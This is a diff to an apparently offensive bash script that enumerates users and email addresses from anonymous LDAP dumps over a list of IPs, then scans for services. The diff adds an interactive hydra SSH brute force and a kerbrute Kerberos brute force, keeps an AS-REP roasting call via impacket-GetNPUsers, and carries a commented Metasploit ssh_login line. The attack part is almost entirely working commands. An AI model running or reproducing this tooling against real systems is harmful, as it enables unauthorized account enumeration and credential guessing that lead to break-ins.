@@ -1,4 +1,5 @@
-cat iplist | while read line
+#!/bin/bash
+for line in $(cat iplist)
 do
 
 
@@ -21,7 +22,12 @@ dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)
 #Grab Users via uid
 echo "=========== [Users via uid] ==========="
 users=$(echo "$dump" | grep  "\<uid: " | cut -d " " -f 2)
-echo "$users"
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
+echo "$users" | head -n 10 
+
+echo "..."
+
 echo "$users" > userlist
 
 
@@ -29,14 +35,24 @@ echo "$users" > userlist
 #Grab Users via dn: uid
 users=$(echo "$dump"  | grep "dn: uid=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
 echo "=========== [Users via dn] ==========="
-echo "$users"
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
+echo "$users" | head -n 10 
+if [ "$nbusers" -gt 10 ]; then 
+echo "..."
+fi
 echo "$users" >> userlist
 
 #Grab Users via member: cn
 
 users=$(echo "$dump"  | grep "member: cn=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
 echo "========= [Users via member] ========="
-echo "$users"
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
+echo "$users" | head -n 10
+if [ "$nbusers" -gt 10 ]; then 
+echo "..."
+fi
 echo "$users" >> userlist
 
 
@@ -44,7 +60,12 @@ echo "$users" >> userlist
 
 users=$(echo "$dump"  | grep "memberUid" | cut -d " " -f 2)
 echo "======= [Users via memberUid] ========"
-echo "$users"
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
+echo "$users" | head -n 10 
+if [ "$nbusers" -gt 10 ]; then 
+echo "..."
+fi
 echo "$users" >> userlist
 
 
@@ -52,23 +73,37 @@ echo "$users" >> userlist
 
 users=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  | cut -d "@" -f 1)
 echo "========= [Users via mail] =========="
-echo "$users"
+nbusers=$(echo "$users" | wc -l )
+echo "$nbusers Users"
+echo "$users" | head -n 10 
+
+if [ "$nbusers" -gt 10 ]; then 
+echo "..."
+fi
 echo "$users" >> userlist
 
 #Grab  mail:
 
 mails=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  )
+nbmails=$(echo "$mails" | wc -l )
 echo "============== [Mail] ==============="
-echo "$mails"
+
+echo "$nbmails Mails"
+echo "$mails" | head -n 10 
+if [ "$nbmails" -gt 10 ]; then 
+echo "..."
+fi
 echo "$mails" >> mails
 
 #remove users duplicates
 
 sort userlist | uniq -i > users
 echo "=========== [Unique users] ==========="
-cat users
 
 users=$(cat users)
+echo " Users"
+echo "$users" | head -n 10 
+echo "..."
 
 if [[ ! -z "$users" ]];then
 echo "=========== [Scan Services] ==========="
@@ -92,12 +127,22 @@ rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 
 
 if [[ ! -z "$ssh_svc" ]];then
-echo "===> SSH Open : Enum With hydra ssh"
+
+echo "===> SSH Open : Enum With hydra ssh ? (yes/no)"
+#echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
+echo "$(echo "$users" | wc -l ) Users"
+read -t 5 sshbrute
+if [ "$sshbrute" == "yes" ];then
+
+#msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set THREADS 10; exploit; exit;"
 bash create_user_password_list.sh > userpass
 hydra -C userpass -t 4 -V $line ssh
-#echo "===> SSH Open : Enum With MSF MODULE SSH_Login"
-#msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set THREADS 10; exploit; exit;"
+else
+
+echo "===> SSH Bruteforce Aborted"
+fi
 else 
+
 echo "===> SSH Closed"
 fi
 
@@ -119,6 +164,9 @@ fi
 if [[ ! -z "$kerb_svc" ]];then
 echo "===> Kerberos Open : Impacket GetNPUsers "
 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users
+echo "===> Kerberos Open : Kerbrute "
+bash create_user_password_list.sh > userpass
+cat userpass | /root/go/bin/kerbrute -d $url bruteforce -
 else 
 echo "===> Kerberos Closed"
 fi
